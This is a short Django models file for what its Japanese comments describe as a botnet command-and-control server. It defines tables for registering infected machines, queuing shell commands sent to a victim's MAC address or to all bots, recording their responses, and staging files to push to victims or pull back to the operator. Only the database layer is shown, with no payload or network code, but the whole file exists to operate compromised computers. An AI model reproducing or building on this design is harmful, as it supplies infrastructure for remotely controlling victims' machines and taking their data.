from django.db import models
from django.utils import timezone

# Create your models here.

'''
感染者の登録
'''
class BotNet(models.Model):
    recipient = models.TextField(unique=True)
    finished = models.DateTimeField(null=True)

    def updated(self):
        self.finished = timezone.now()
        self.save()
        return self

'''
感染者が受け取る用
'''
class UpFile(models.Model):
    name = models.CharField(max_length=100)
    content = models.TextField()

'''
送信者が受け取る用
'''
class DownFile(models.Model):
    name = models.CharField(max_length=100)
    link = models.URLField(unique=True)

'''
sender: ユーザID
recipient: MACアドレスかALL
'''
class Command(models.Model):
    sender = models.IntegerField()
    cmd = models.TextField()
    recipient = models.TextField()
    response = models.TextField()
    upfile = models.OneToOneField(UpFile, default=None, null=True, blank=True, unique=True, related_name='command', on_delete=models.CASCADE)
    downfile = models.OneToOneField(DownFile, default=None, null=True, blank=True, unique=True, related_name='command', on_delete=models.CASCADE)
    cmd_finished = models.DateTimeField(null=True, blank=True)
    resp_finished = models.DateTimeField(null=True, blank=True)

    def finished(self, op):
        if op == 'cmd':
            self.cmd_finished = timezone.now()
        elif op == 'resp':
            self.resp_finished = timezone.now()
        self.save()

    def connect_upfile(self, qs):
        self.upfile = qs
        self.save()

    def connect_downfile(self, qs):
        self.downfile = qs
        self.save()